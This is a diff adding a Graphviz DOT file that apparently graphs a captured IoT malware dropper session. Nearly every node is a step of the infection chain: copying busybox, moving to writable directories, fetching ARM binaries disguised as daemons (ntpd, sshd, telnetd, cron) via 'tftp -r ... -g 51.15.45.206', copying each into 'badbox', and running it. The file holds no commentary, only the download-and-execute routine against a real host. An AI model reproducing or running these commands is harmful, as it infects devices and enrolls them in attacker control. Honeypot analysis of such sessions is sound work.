@@ -1,0 +1,264 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 14 [label="||,"];
+14 [label="tftp -r armexntpd -g 51.15.45.206 "];
+14 -> 16 [label=";,"];
+16 [label="cat armexntpd badbox "];
+16 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 34 [label="||,"];
+34 [label="tftp -r armexsshd -g 51.15.45.206 "];
+34 -> 36 [label=";,"];
+36 [label="cat armexsshd badbox "];
+36 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 54 [label="||,"];
+54 [label="tftp -r armexopenssh -g 51.15.45.206 "];
+54 -> 56 [label=";,"];
+56 [label="cat armexopenssh badbox "];
+56 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 74 [label="||,"];
+74 [label="tftp -r armexbash -g 51.15.45.206 "];
+74 -> 76 [label=";,"];
+76 [label="cat armexbash badbox "];
+76 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 94 [label="||,"];
+94 [label="tftp -r armextftp -g 51.15.45.206 "];
+94 -> 96 [label=";,"];
+96 [label="cat armextftp badbox "];
+96 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 114 [label="||,"];
+114 [label="tftp -r armexwget -g 51.15.45.206 "];
+114 -> 116 [label=";,"];
+116 [label="cat armexwget badbox "];
+116 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 134 [label="||,"];
+134 [label="tftp -r armexcron -g 51.15.45.206 "];
+134 -> 136 [label=";,"];
+136 [label="cat armexcron badbox "];
+136 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 154 [label="||,"];
+154 [label="tftp -r armexftp -g 51.15.45.206 "];
+154 -> 156 [label=";,"];
+156 [label="cat armexftp badbox "];
+156 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 174 [label="||,"];
+174 [label="tftp -r armexpftp -g 51.15.45.206 "];
+174 -> 176 [label=";,"];
+176 [label="cat armexpftp badbox "];
+176 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 194 [label="||,"];
+194 [label="tftp -r armexsh -g 51.15.45.206 "];
+194 -> 196 [label=";,"];
+196 [label="cat armexsh badbox "];
+196 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 214 [label="||,"];
+214 [label="tftp -r armexnut -g 51.15.45.206 "];
+214 -> 216 [label=";,"];
+216 [label="cat armexnut badbox "];
+216 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 234 [label="||,"];
+234 [label="tftp -r armexapache2 -g 51.15.45.206 "];
+234 -> 236 [label=";,"];
+236 [label="cat armexapache2 badbox "];
+236 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 254 [label="||,"];
+254 [label="tftp -r armextelnetd -g 51.15.45.206 "];
+254 -> 256 [label=";,"];
+256 [label="cat armextelnetd badbox "];
+256 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+}
